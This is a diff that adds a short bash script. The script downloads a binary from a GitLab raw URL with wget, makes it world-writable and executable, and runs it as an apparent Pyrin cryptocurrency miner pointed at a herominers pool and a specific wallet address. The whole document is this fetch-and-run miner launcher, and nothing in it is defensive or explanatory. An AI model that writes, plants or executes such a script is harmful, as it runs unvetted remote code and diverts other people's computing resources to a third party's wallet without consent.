@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
+chmod 777 lol1.81
+./lol1.81 -a PYRIN -p de.pyrin.herominers.com:1177 -u pyrin:qz5mu36m6hy997g3ytu92rwlhr3exvpdhyke3vhmak02lxc9n7xxkcrac36jx.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
